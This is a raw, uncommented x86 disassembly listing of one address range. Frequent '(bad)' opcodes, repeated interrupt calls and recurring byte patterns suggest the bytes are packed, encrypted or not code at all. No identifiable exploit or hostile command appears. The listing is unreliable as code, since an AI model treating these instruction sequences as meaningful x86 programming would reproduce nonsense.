  4239d7:	sub    BYTE PTR [ebx+0x13],dl
  4239da:	jno    0x4239dc
  4239dc:	jo     0x4239f2
  4239de:	or     dh,BYTE PTR [esi+0x65]
  4239e1:	int    0x76
  4239e3:	mov    ch,cl
  4239e5:	lea    ebp,[ebp+0x3bad96cd]
  4239eb:	or     al,0xd3
  4239ed:	jmp    0x423981
  4239ef:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239f5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239fc:	jno    0x4239cb
  4239fe:	lea    edx,[ebp+0x3b9596cd]
  423a04:	or     al,0x3b
  423a06:	cdq    
  423a07:	shr    ebx,cl
  423a09:	xchg   edx,eax
  423a0a:	shr    edx,cl
  423a0c:	sub    BYTE PTR [ebx+0x13],dl
  423a0f:	jno    0x4239de
  423a11:	lea    esi,[ebp+0xb596cd]
  423a17:	(bad)  
  423a18:	cmp    eax,0x993b0c3b
  423a1d:	shr    ebx,cl
  423a1f:	xchg   edx,eax
  423a20:	shr    edx,cl
  423a22:	sub    BYTE PTR [ebx+0x13],dl
  423a25:	jno    0x423a27
  423a27:	jo     0x423a3d
  423a29:	int    0x8d
  423a2b:	mov    ch,0xa
  423a2d:	jbe    0x4239dc
  423a2f:	int    0x76
  423a31:	mov    ch,0x3b
  423a33:	or     al,0x3b
  423a35:	jns    0x423a0a
  423a37:	jmp    0x4239cb
  423a39:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a3f:	jbe    0x423aa6
  423a41:	inc    ebx
  423a42:	jge    0x423a73
  423a44:	add    eax,0x8080853c
  423a49:	int    0x8d
  423a4b:	mov    ch,0xcd
  423a4d:	xchg   esi,eax
  423a4e:	mov    ch,0x3b
  423a50:	or     al,0x3b
  423a52:	cdq    
  423a53:	shr    ebx,cl
  423a55:	xchg   edx,eax
  423a56:	shr    edx,cl
  423a58:	sub    BYTE PTR [ebx+0x13],dl
  423a5b:	inc    ebx
  423a5c:	lea    ebp,[ebp-0x7ab2fad1]
  423a62:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a69:	and    eax,0x192ebd3
  423a6e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a74:	mov    ch,0xcd
  423a76:	lea    esi,[ebp+0x192ebd3]
  423a7c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a82:	lea    esi,ds:0xd3358dcd
  423a88:	jmp    0x423a1c
  423a8a:	add    DWORD PTR [edx],eax
  423a8c:	scas   eax,DWORD PTR es:[edi]
  423a8d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a91:	aaa    
  423a92:	sbb    al,0x0
  423a94:	add    BYTE PTR [eax],al
  423a96:	add    BYTE PTR [edi+esi*1],0x24
  423a9a:	add    BYTE PTR [eax],al
  423a9c:	add    BYTE PTR [eax+0x24cfcf],al
  423aa2:	add    BYTE PTR [eax],al
  423aa4:	jno    0x423aa6
  423aa6:	(bad)  
  423aa7:	cmp    eax,0x1ccfcf
  423aac:	add    BYTE PTR [eax],al
  423aae:	add    dh,dl
  423ab0:	lods   eax,DWORD PTR ds:[esi]
  423ab1:	jno    0x423a80
  423ab3:	lea    ecx,ds:0xcd4c9100
  423ab9:	lea    esi,[ebp+0x4]
  423abc:	shl    DWORD PTR [eax],cl
  423abe:	jno    0x423b30
  423ac0:	mov    ebp,0xefef
  423ac5:	or     dh,BYTE PTR [esi-0x30]
  423ac8:	int    0x76
  423aca:	mov    ch,cl
  423acc:	lea    ebp,ds:0xcd2d96cd
  423ad2:	add    DWORD PTR [ecx],edx
  423ad4:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423ade:	shr    edx,cl
  423ae0:	sub    BYTE PTR [ebx+0x13],dl
  423ae3:	jno    0x423ab2
  423ae5:	lea    esi,[ebp+0x3bb596cd]
  423aeb:	or     al,0x3b
  423aed:	cdq    
  423aee:	shr    ebx,cl
  423af0:	xchg   edx,eax
  423af1:	shr    edx,cl
  423af3:	sub    BYTE PTR [ebx+0x13],dl
  423af6:	jno    0x423af8
  423af8:	(bad)  
  423af9:	add    BYTE PTR gs:[eax+0x1c],dh
  423afd:	int    0x76
  423aff:	rcl    bl,1
  423b01:	ins    DWORD PTR es:[edi],dx
  423b02:	xchg   edx,eax
  423b03:	cmp    ecx,ecx
  423b05:	inc    ebx
  423b06:	leave  
  423b07:	int    0x76
  423b09:	mov    ch,cl
  423b0b:	lea    ebp,ds:0x811101cd
  423b11:	add    BYTE PTR [eax-0x29d26933],0x54
  423b18:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b1b:	cdq    
  423b1c:	shr    ebx,cl
  423b1e:	xchg   edx,eax
  423b1f:	shr    edx,cl
  423b21:	sub    BYTE PTR [ebx+0x13],dl
  423b24:	jno    0x423af3
  423b26:	lea    esi,[ebp+0x3bb596cd]
  423b2c:	or     al,0x3b
  423b2e:	cdq    
  423b2f:	shr    ebx,cl
  423b31:	xchg   edx,eax
  423b32:	shr    edx,cl
  423b34:	sub    BYTE PTR [ebx+0x13],dl
  423b37:	jno    0x423b39
  423b39:	(bad)  
  423b3a:	jne    0x423b3c
  423b3c:	jo     0x423b5a
  423b3e:	int    0x76
  423b40:	lods   eax,DWORD PTR ds:[esi]
  423b41:	or     dh,BYTE PTR [esi+0x75]
  423b44:	int    0x76
  423b46:	cmp    eax,0xecfd760a
  423b4b:	cmp    BYTE PTR [ebx],bh
  423b4d:	or     al,0x3b
  423b4f:	cdq    
  423b50:	shr    ebx,cl
  423b52:	xchg   edx,eax
  423b53:	shr    edx,cl
  423b55:	sub    BYTE PTR [ebx+0x13],dl
  423b58:	jno    0x423b27
  423b5a:	lea    esi,[ebp+0x3bb596cd]
  423b60:	or     al,0x3b
  423b62:	cdq    
  423b63:	shr    ebx,cl
  423b65:	xchg   edx,eax
  423b66:	shr    edx,cl
  423b68:	sub    BYTE PTR [ebx+0x13],dl
  423b6b:	jno    0x423b6d
  423b6d:	(bad)  
  423b6e:	lods   eax,DWORD PTR ds:[esi]
  423b6f:	add    BYTE PTR [eax+0x1c],dh
  423b72:	int    0x76
  423b74:	std    
  423b75:	or     dh,BYTE PTR [esi+0x1d]
  423b78:	int    0x76
  423b7a:	jne    0x423b86
  423b7c:	out    0x55,al
  423b7e:	or     dh,BYTE PTR [esi-0x30]
  423b81:	leave  
  423b82:	jbe    0x423b21
  423b84:	inc    ecx
  423b85:	and    DWORD PTR [esi+0x5576cd35],eax
  423b8b:	int    0x8d
  423b8d:	push   ebp
  423b8e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b91:	or     al,0xd3
  423b93:	lods   eax,DWORD PTR ds:[esi]
  423b94:	sub    bl,dl
  423b96:	jmp    0x423b2a
  423b98:	push   ebx
  423b99:	ror    DWORD PTR [edx],cl
  423b9b:	jbe    0x423be2
  423b9d:	int    0x76
  423b9f:	push   ebp
  423ba0:	int    0x8d
  423ba2:	push   ebp
  423ba3:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ba6:	or     al,0xd3
  423ba8:	lods   eax,DWORD PTR ds:[esi]
  423ba9:	sub    bl,dl
  423bab:	jmp    0x423b3f
  423bad:	push   ebx
  423bae:	ror    DWORD PTR [edx],cl
  423bb0:	jbe    0x423bbf
  423bb2:	leave  
  423bb3:	jbe    0x423b4a
  423bb5:	dec    eax
  423bb6:	and    DWORD PTR [esi-0x528936cb],eax
  423bbc:	ret    0x8621
  423bbf:	xor    eax,0xcd5576cd
  423bc4:	lea    edx,[ebp+0x3b]
  423bc7:	jns    0x423c04
  423bc9:	or     al,0xd3
  423bcb:	jmp    0x423b5f
  423bcd:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bd3:	lea    ebx,ds:0x52f7d43
  423bd9:	push   ss
  423bda:	xchg   DWORD PTR [eax-0x6d241480],eax
  423be0:	add    BYTE PTR [eax-0x326a7233],0x76
  423be7:	xchg   ebp,eax
  423be8:	int    0x96
  423bea:	inc    ebp
  423beb:	cmp    eax,ebp
  423bed:	cmp    ecx,DWORD PTR [edi]
  423bef:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423bf5:	push   ebx
  423bf6:	jge    0x423bc5
  423bf8:	jbe    0x423c17
  423bfa:	xor    edx,edx
  423bfc:	cmp    ebx,edx
  423bfe:	clc    
  423bff:	add    cl,BYTE PTR [edx]
  423c01:	jbe    0x423c10
  423c03:	int    0x76
  423c05:	lods   eax,DWORD PTR ds:[esi]
  423c06:	int    0x8d
  423c08:	lods   eax,DWORD PTR ds:[esi]
  423c09:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c0c:	or     al,0xd3
  423c0e:	jmp    0x423ba2
  423c10:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c16:	lea    ecx,ds:0x16d87d43
  423c1c:	int    0x76
  423c1e:	lods   eax,DWORD PTR ds:[esi]
  423c1f:	int    0x8d
  423c21:	lods   eax,DWORD PTR ds:[esi]
  423c22:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c25:	or     al,0xd3
  423c27:	lods   eax,DWORD PTR ds:[esi]
  423c28:	sub    bl,dl
  423c2a:	jmp    0x423bbe
  423c2c:	push   ebx
  423c2d:	ror    DWORD PTR [edx],cl
  423c2f:	jbe    0x423c3e
  423c31:	int    0x76
  423c33:	xchg   ebp,eax
  423c34:	int    0x8d
  423c36:	xchg   ebp,eax
  423c37:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c3a:	or     al,0xd3
  423c3c:	lods   eax,DWORD PTR ds:[esi]
  423c3d:	sub    bl,dl
  423c3f:	jmp    0x423bd3
  423c41:	push   ebx
  423c42:	ror    ebp,cl
  423c44:	lea    ecx,ds:0xad3d12f
  423c4a:	jbe    0x423c59
  423c4c:	int    0x76
  423c4e:	push   ebp
  423c4f:	int    0x8d
  423c51:	push   ebp
  423c52:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c55:	or     al,0xd3
  423c57:	jmp    0x423beb
  423c59:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c5f:	lea    ecx,ds:0x52f7d43
  423c65:	pusha  
  423c66:	xchg   edx,eax
  423c67:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c6e:	or     eax,0x874576cd
  423c73:	jbe    0x423c45
  423c75:	or     ah,dh
  423c77:	cmp    eax,0x5d5d760a
  423c7c:	inc    ecx
  423c7d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c83:	leave  
  423c84:	jbe    0x423ceb
  423c86:	cmp    DWORD PTR [ecx],esp
  423c88:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c8e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c94:	int    0x76
  423c96:	cmp    eax,0x3b3d8dcd
  423c9b:	jns    0x423cd8
  423c9d:	or     al,0xd3
  423c9f:	lods   eax,DWORD PTR ds:[esi]
  423ca0:	sub    bl,dl
  423ca2:	jmp    0x423c36
  423ca4:	push   ebx
  423ca5:	ror    DWORD PTR [edx],cl
  423ca7:	jbe    0x423d26
  423ca9:	int    0x6d
  423cab:	jmp    0x423cb3
  423cad:	add    DWORD PTR [eax-0x36923280],0x8c06
  423cb7:	add    BYTE PTR [ebx],cl
  423cb9:	and    DWORD PTR [esi-0x369232cb],eax
  423cbf:	push   es
  423cc0:	jl     0x423cc2
  423cc2:	add    BYTE PTR [eax],al
  423cc4:	mul    DWORD PTR [ecx]
  423cc6:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423ccc:	int    0x76
  423cce:	icebp  
  423ccf:	int    0x8d
  423cd1:	icebp  
  423cd2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cd5:	or     al,0xd3
  423cd7:	lods   eax,DWORD PTR ds:[esi]
  423cd8:	sub    bl,dl
  423cda:	jmp    0x423c6e
  423cdc:	push   ebx
  423cdd:	ror    ebp,cl
  423cdf:	lea    edi,[ebp+0x2f]
  423ce2:	rcl    ebx,1
  423ce4:	int    0x8d
  423ce6:	pop    ebp
  423ce7:	retf   0x8884
  423cea:	or     DWORD PTR [esi-0x1f],esi
  423ced:	int    0x6d
  423cef:	int    0x76
  423cf1:	icebp  
  423cf2:	int    0x8d
  423cf4:	icebp  
  423cf5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423cf8:	jns    0x423ccd
  423cfa:	jmp    0x423c8e
  423cfc:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d02:	lea    edi,[ebp+0x2f]
  423d05:	rcl    ebx,1
  423d07:	int    0x8d
  423d09:	gs int 0x96
  423d0c:	cmp    ecx,DWORD PTR gs:[edi]
  423d0f:	cmp    edx,ebp
  423d11:	shl    edx,cl
  423d13:	sub    bl,dl
  423d15:	repz xchg edx,eax
  423d17:	push   ebx
  423d18:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d1e:	das    
  423d1f:	pop    ecx
  423d20:	dec    esp
  423d21:	mov    ch,cl
  423d23:	push   es
  423d24:	mov    WORD PTR [eax],es
  423d26:	add    BYTE PTR [eax],al
  423d28:	int    0x17
  423d2a:	mov    WORD PTR [eax],es
  423d2c:	add    BYTE PTR [eax],al
  423d2e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d31:	aad    0xd3
  423d33:	lods   eax,DWORD PTR ds:[esi]
  423d34:	sub    bl,dl
  423d36:	repz xchg edx,eax
  423d38:	push   ebx
  423d39:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d3f:	loope  0x423d7c
  423d41:	jge    0x423d4c
  423d43:	(bad)  
  423d44:	loope  0x423d13
  423d46:	ins    DWORD PTR es:[edi],dx
  423d47:	retf   0xe176
  423d4a:	int    0x8d
  423d4c:	icebp  
  423d4d:	int    0x96
  423d4f:	icebp  
  423d50:	cmp    ecx,DWORD PTR [edi]
  423d52:	cmp    edx,ebp
  423d54:	shl    ebx,cl
  423d56:	xchg   edx,eax
  423d57:	shl    edx,cl
  423d59:	sub    BYTE PTR [ebx+0x13],dl
  423d5c:	int    0x96
  423d5e:	jge    0x423d8f
  423d60:	rcl    DWORD PTR [ebx],1
  423d62:	int    0x96
  423d64:	pop    ebp
  423d65:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d6c:	icebp  
  423d6d:	int    0x8d
  423d6f:	icebp  
  423d70:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d73:	or     al,0xd3
  423d75:	lods   eax,DWORD PTR ds:[esi]
  423d76:	sub    bl,dl
  423d78:	jmp    0x423d0c
  423d7a:	push   ebx
  423d7b:	ror    ebp,cl
  423d7d:	lea    edi,[ebp+0x2f]
  423d80:	rcl    ebx,1
  423d82:	int    0x8d
  423d84:	pop    ebp
  423d85:	retf   0x8884
  423d88:	or     DWORD PTR [esi-0x1f],esi
  423d8b:	int    0x6d
  423d8d:	int    0x76
  423d8f:	icebp  
  423d90:	int    0x8d
  423d92:	icebp  
  423d93:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d96:	lods   eax,DWORD PTR ds:[esi]
  423d97:	sub    BYTE PTR [ebx],bh
  423d99:	or     al,0xd3
  423d9b:	jmp    0x423d2f
  423d9d:	push   ebx
  423d9e:	ror    ebp,cl
  423da0:	lea    edi,[ebp+0x2f]
  423da3:	rcl    ebx,1
  423da5:	int    0x8d
  423da7:	ins    DWORD PTR es:[edi],dx
  423da8:	int    0x96
  423daa:	ins    DWORD PTR es:[edi],dx
  423dab:	cmp    ecx,DWORD PTR [edi]
  423dad:	cmp    edx,ebp
  423daf:	shl    edx,cl
  423db1:	sub    bl,dl
  423db3:	repz xchg edx,eax
  423db5:	push   ebx
  423db6:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423dbc:	das    
  423dbd:	pop    ecx
  423dbe:	dec    esp
  423dbf:	mov    ch,cl
  423dc1:	push   es
  423dc2:	jl     0x423dc4
  423dc4:	add    BYTE PTR [eax],al
  423dc6:	int    0x17
  423dc8:	jl     0x423dca
  423dca:	add    BYTE PTR [eax],al
  423dcc:	cmp    edi,DWORD PTR [ecx+0x3b]
  423dcf:	aad    0xd3
  423dd1:	lods   eax,DWORD PTR ds:[esi]
  423dd2:	sub    bl,dl
  423dd4:	repz xchg edx,eax
  423dd6:	push   ebx
  423dd7:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423ddd:	loope  0x423e1a
  423ddf:	jge    0x423dea
  423de1:	(bad)  
  423de2:	loope  0x423db1
  423de4:	ins    DWORD PTR es:[edi],dx
  423de5:	retf   0xe176
  423de8:	int    0x8d
  423dea:	icebp  
  423deb:	int    0x96
  423ded:	icebp  
  423dee:	cmp    ecx,DWORD PTR [edi]
  423df0:	cmp    edx,ebp
  423df2:	shl    ebx,cl
  423df4:	xchg   edx,eax
  423df5:	shl    edx,cl
  423df7:	sub    BYTE PTR [ebx+0x13],dl
  423dfa:	int    0x96
  423dfc:	jge    0x423e2d
  423dfe:	rcl    DWORD PTR [ebx],1
  423e00:	int    0x96
  423e02:	pop    ebp
  423e03:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e0a:	and    eax,0x3b258dcd
  423e0f:	or     al,0x3b
  423e11:	jns    0x423de6
  423e13:	jmp    0x423da7
  423e15:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e1b:	lea    ebp,[ebp-0x33]
  423e1e:	xchg   esi,eax
  423e1f:	ins    DWORD PTR es:[edi],dx
  423e20:	cmp    ecx,DWORD PTR [edi]
  423e22:	cmp    edx,ebp
  423e24:	shl    edx,cl
  423e26:	sub    bl,dl
  423e28:	repz xchg edx,eax
  423e2a:	push   ebx
  423e2b:	adc    ebp,DWORD PTR [edi]
  423e2d:	rcl    ebx,1
  423e2f:	xchg   DWORD PTR [esi+0x7d],esi
  423e32:	or     dh,BYTE PTR [esi+0x7d]
  423e35:	int    0x76
  423e37:	jge    0x423e06
  423e39:	lea    ecx,ds:0xb2f7d43
  423e3f:	(bad)  
  423e40:	inc    DWORD PTR [eax]
  423e42:	add    ch,cl
  423e44:	jbe    0x423eb3
  423e46:	int    0x8d
  423e48:	ins    DWORD PTR es:[edi],dx
  423e49:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e4c:	jmp    0x423de0
  423e4e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e51:	lods   eax,DWORD PTR ds:[esi]
  423e52:	sub    BYTE PTR [ebx-0x2d],dl
  423e55:	int    0x8d
  423e57:	or     eax,0xcdd3d12f
  423e5c:	lea    edi,ds:0xf2d30f3b
  423e62:	sub    BYTE PTR [ebx-0x2d],dl
  423e65:	int    0x8d
  423e67:	cmp    eax,0xebd30c3b
  423e6c:	xchg   edx,eax
  423e6d:	push   ebx
  423e6e:	ror    DWORD PTR [edx],cl
  423e70:	jbe    0x423ed7
  423e72:	int    0x76
  423e74:	popf   
  423e75:	int    0x8d
  423e77:	popf   
  423e78:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e7b:	jmp    0x423e0f
  423e7d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e80:	lods   eax,DWORD PTR ds:[esi]
  423e81:	sub    BYTE PTR [ebx-0x2d],dl
  423e84:	int    0x8d
  423e86:	popf   
  423e87:	int    0x96
  423e89:	popf   
  423e8a:	cmp    ecx,DWORD PTR [edi]
  423e8c:	shl    edx,cl
  423e8e:	sub    BYTE PTR [ebx],bh
  423e90:	aad    0xd3
  423e92:	repz xchg edx,eax
  423e94:	push   ebx
  423e95:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e9b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423ea1:	in     al,dx
  423ea2:	sbb    al,0xcd
  423ea4:	jbe    0x423e43
  423ea6:	int    0x8d
  423ea8:	popf   
  423ea9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423eac:	or     al,0xd3
  423eae:	lods   eax,DWORD PTR ds:[esi]
  423eaf:	sub    bl,dl
  423eb1:	jmp    0x423e45
  423eb3:	push   ebx
  423eb4:	rol    DWORD PTR [edi+0x760a4576],cl
  423eba:	inc    ebp
  423ebb:	int    0x76
  423ebd:	popf   
  423ebe:	int    0x8d
  423ec0:	popf   
  423ec1:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ec4:	lods   eax,DWORD PTR ds:[esi]
  423ec5:	sub    BYTE PTR [ebx],bh
  423ec7:	or     al,0xd3
  423ec9:	jmp    0x423e5d
  423ecb:	push   ebx
  423ecc:	ror    ebp,cl
  423ece:	lea    ebx,ds:0x76cd7d33
  423ed4:	popf   
  423ed5:	int    0x96
  423ed7:	popf   
  423ed8:	cmp    edi,DWORD PTR [ecx+0x3b]
  423edb:	aad    0xd3
  423edd:	repz xchg edx,eax
  423edf:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ee5:	xchg   esi,eax
  423ee6:	inc    ebp
  423ee7:	das    
  423ee8:	rcl    edx,1
  423eea:	inc    ebx
  423eeb:	shr    DWORD PTR [edi],cl
  423eed:	pop    es
  423eee:	adc    ebp,edi
  423ef0:	add    BYTE PTR [eax],al
  423ef2:	int    0x76
  423ef4:	mov    BYTE PTR [eax],al
  423ef6:	(bad)  
  423ef7:	dec    esp
  423ef8:	iret   
  423ef9:	jbe    0x423eb8
  423efb:	add    dh,dl
  423efd:	mov    BYTE PTR [eax-0x33],dh
  423f00:	jbe    0x423e8a
  423f02:	int    0x1
  423f04:	xchg   ebp,eax
  423f05:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f0f:	icebp  
  423f10:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f1a:	jne    0x423ed9
  423f1c:	test   al,0x88
  423f1e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f25:	stc    
  423f26:	int    0x8d
  423f28:	stc    
  423f29:	cmp    eax,ebp
  423f2b:	cmp    ecx,DWORD PTR [edi]
  423f2d:	shl    edx,cl
  423f2f:	sub    bl,dl
  423f31:	mov    ebp,0xcdd35392
  423f36:	lea    esi,[ebp+0x43]
  423f39:	rcl    esp,cl
  423f3b:	push   esi
  423f3c:	int    0x76
  423f3e:	mov    ch,cl
  423f40:	lea    ebp,ds:0xcd2d96cd
  423f46:	add    DWORD PTR [ecx],edx
  423f48:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f52:	shr    edx,cl
  423f54:	sub    BYTE PTR [ebx+0x13],dl
  423f57:	jno    0x423f26
  423f59:	(bad)  
  423f5a:	stc    
  423f5b:	int    0x96
  423f5d:	stc    
  423f5e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f61:	cdq    
  423f62:	shr    ebx,cl
  423f64:	xchg   edx,eax
  423f65:	shr    edx,cl
  423f67:	sub    BYTE PTR [ebx+0x13],dl
  423f6a:	jno    0x423f6c
  423f6c:	(bad)  
  423f6d:	jne    0x423f6f
  423f6f:	jo     0x423f8d
  423f71:	stos   BYTE PTR es:[edi],al
  423f72:	test   al,0x63
  423f74:	retf   
  423f75:	ror    BYTE PTR [eax-0x12326980],cl
  423f7b:	add    al,0xed
  423f7d:	and    al,0x98
  423f7f:	int    0x11
  423f81:	int    0x12
  423f83:	sub    eax,0x4808081
  423f88:	pop    esp
  423f89:	sub    BYTE PTR [edi],0x5
  423f8c:	dec    edx
  423f8d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f97:	add    BYTE PTR [esi],0xf7
  423f9a:	das    
  423f9b:	add    eax,0x80808003
  423fa0:	int    0x7
  423fa2:	or     DWORD PTR [eax+0x6d068080],eax
  423fa8:	das    
  423fa9:	add    eax,0x808080e9
  423fae:	add    al,0x69
  423fb0:	int3   
  423fb1:	add    BYTE PTR [eax+0x52f3080],0xe2
  423fb8:	add    BYTE PTR [eax+0x54985e80],0x2f
  423fbf:	add    eax,0x808080e3
  423fc4:	int    0xc1
  423fc6:	and    eax,0x4808081
  423fcb:	mov    dh,0x11
  423fcd:	or     ch,0x13
  423fd0:	xor    ecx,DWORD PTR [esi-0x79]
  423fd3:	shr    BYTE PTR [edi],cl
  423fd5:	mov    ebx,0x8d0a4c70
  423fda:	mov    ch,0x2f
  423fdc:	mov    ebx,0x13874e7c
  423fe1:	das    
  423fe2:	add    eax,0x80808049
  423fe7:	iret   
  423fe8:	jl     0x423ffe
  423fea:	pop    ebx
  423feb:	or     cl,BYTE PTR [ebp+0x69bd]
  423ff1:	add    BYTE PTR [ebx-0x2baef966],al
  423ff7:	or     ebp,0x31
  423ffa:	add    al,0xb6
  423ffc:	cmc    
  423ffd:	sub    BYTE PTR [ebx],0x99
  424000:	xchg   ecx,esi
  424002:	das    
  424003:	mov    ebx,0xbb2f4ee0
  424008:	mov    al,ds:0xd4fc874c
  42400d:	mov    esi,0xa148acf
  424012:	(bad)  
  424013:	in     eax,dx
  424014:	push   es
  424015:	push   ecx
  424016:	aam    0x6e
  424018:	int    0x89
  42401a:	add    al,0xb6
  42401c:	stc    
  42401d:	sub    BYTE PTR [ebx],0xf
  424020:	xchg   DWORD PTR [ebp+0x2f],edi
  424023:	mov    ebx,0xbb2f4ede
  424028:	sahf   
  424029:	dec    esp
  42402a:	xchg   esp,edi
  42402c:	aam    0x33
  42402e:	iret   
  42402f:	ficom  WORD PTR [edx+ecx*1]
  424032:	out    0xfd,al
  424034:	int    0xe6
  424036:	std    
  424037:	int    0x6a
  424039:	push   es
  42403a:	add    ah,dl
  42403c:	xchg   ch,cl
  42403e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42403f:	mov    ch,0x81
  424041:	and    al,0x8b
  424043:	das    
  424044:	mov    ebx,0xbb2f4ede
  424049:	sahf   
  42404a:	dec    esp
  42404b:	add    BYTE PTR [esi-0x7],dh
  42404e:	add    al,0x76
  424050:	std    
  424051:	mov    BYTE PTR [edi-0x619a104],al
  424057:	sbb    ch,0x2f
  42405a:	mov    ebx,0xbb2f4ee0
  42405f:	mov    al,ds:0xed8dcd4c
  424064:	add    BYTE PTR [esi-0xb],dh
  424067:	add    al,0xd3
  424069:	mov    BYTE PTR [edi-0x1272f504],al
  42406f:	pop    esi
  424070:	out    0xf5,al
  424072:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424079:	jo     0x4240c9
  42407b:	das    
  42407c:	mov    ebx,0x76004cdc
  424081:	adc    DWORD PTR [ebx+edx*8],eax
  424084:	mov    BYTE PTR [edi-0x4272f527],al
  42408a:	pop    esi
  42408b:	xchg   esi,eax
  42408c:	adc    DWORD PTR [edi],ebp
  42408e:	or     ebp,DWORD PTR [esi-0x56000000]
  424094:	arpl   WORD PTR [ebx],di
  424096:	ins    DWORD PTR es:[edi],dx
  424097:	ins    BYTE PTR es:[edi],dx
  424098:	in     al,dx
  424099:	xchg   edx,eax
  42409a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42409d:	retf   
  42409e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  4240a4:	sub    eax,0xcd808081
  4240a9:	jbe    0x4240f7
  4240ab:	add    al,0xed
  4240ad:	xor    BYTE PTR [ebx+0x3b],bl
  4240b0:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  4240b6:	add    eax,0x8080800b
  4240bb:	inc    ebx
  4240bc:	(bad)
  4240bf:	pop    esi
  4240c0:	pushf  
  4240c1:	(bad)  
  4240c3:	test   DWORD PTR [ebx],edi
  4240c5:	ins    DWORD PTR es:[edi],dx
  4240c6:	ins    BYTE PTR es:[edi],dx
  4240c7:	in     al,dx
  4240c8:	fmul   st,st(5)
  4240ca:	ins    BYTE PTR es:[edi],dx
  4240cb:	fadd   QWORD PTR [edi+0x7ccd8876]
  4240d1:	and    al,0xcd
  4240d3:	jo     0x424109
  4240d5:	int    0x90
  4240d7:	adc    al,0xcd
  4240d9:	fcomp  QWORD PTR [edi+eax*4]
  4240dc:	lea    ecx,[eax+0xa889687]
  4240e2:	(bad)  
  4240e3:	std    
  4240e4:	inc    ebx
  4240e5:	clc    
  4240e6:	jnp    0x42406f
  4240e8:	or     ah,dh
  4240ea:	std    
  4240eb:	or     ah,BYTE PTR [esi-0x259a107]
  4240f1:	fsub   st,st(3)
  4240f3:	inc    ebx
  4240f4:	pushf  
  4240f5:	adc    al,0x77
  4240f7:	xchg   BYTE PTR [edi],ch
  4240f9:	mov    ebx,0x92eca054
  4240fe:	int    0xf4
  424100:	iret   
  424101:	push   esp
  424102:	ror    ebp,0x68
  424105:	push   es
  424106:	add    ah,dl
  424108:	ds xchg esi,esp
  42410b:	mov    BYTE PTR [edx],cl
  42410d:	out    0x11,al
  42410f:	inc    ebx
  424110:	stc    
  424111:	fdiv   DWORD PTR [eax]
  424113:	int    0xa6
  424115:	dec    esp
  424116:	int    0x63
  424118:	in     al,0x87
  42411a:	popf   
  42411b:	inc    ebx
  42411c:	cld    
  42411d:	ja     0x4240a3
  42411f:	int    0x58
  424121:	in     al,dx
  424122:	mov    BYTE PTR [ebx],dh
  424124:	out    0x88,al
  424126:	or     ch,BYTE PTR [eax-0x33]
  424129:	(bad)  
  42412a:	adc    DWORD PTR [esi],eax
  42412c:	not    esp
  42412e:	dec    esi
  42412f:	int    0xa6
  424131:	stc    
  424132:	dec    ebx
  424133:	or     ah,BYTE PTR [esi-0x259bc07]
  424139:	sbb    BYTE PTR [ebp-0x14],0x8
  42413d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424140:	test   al,0x63
  424142:	retf   
  424143:	ror    BYTE PTR [eax-0x12326980],cl
  424149:	add    al,0xed
  42414b:	push   eax
  42414c:	pop    ebx
  42414d:	cwde   
  42414e:	pop    ebp
  42414f:	dec    ecx
  424150:	and    DWORD PTR [esi-0x289f5cb],eax
  424156:	leave  
  424157:	jbe    0x424152
  424159:	inc    ecx
  42415a:	and    DWORD PTR [esi-0x27232cb],eax
  424160:	int    0xa6
  424162:	std    
  424163:	call   0x3b81:0x90cfffc0
  42416a:	psrlq  mm5,mm3
  42416d:	xchg   edx,eax
